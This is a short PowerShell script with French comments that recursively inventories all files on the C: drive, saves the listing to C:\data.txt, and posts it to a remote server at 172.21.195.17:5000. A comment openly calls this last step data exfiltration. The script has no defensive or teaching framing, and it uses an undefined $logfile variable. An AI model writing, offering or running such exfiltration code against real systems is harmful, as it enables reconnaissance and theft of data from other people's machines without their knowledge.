# Chemin où le script sera enregistré
$DataPath = "C:\data.txt"
$IP_addr = '172.21.195.17:5000'
# Collecte d'informations sur les fichiers du système
Get-ChildItem -Path "C:\" -Recurse | Format-Table Name, LastWriteTime, Length | Out-File $DataPath

$exfiltrationServer = "http://$IP_addr/data"

# Exfiltration de données
Get-Content $DataPath | Out-File $logfile
Invoke-RestMethod -Uri $exfiltrationServer -Method Post -InFile $logfile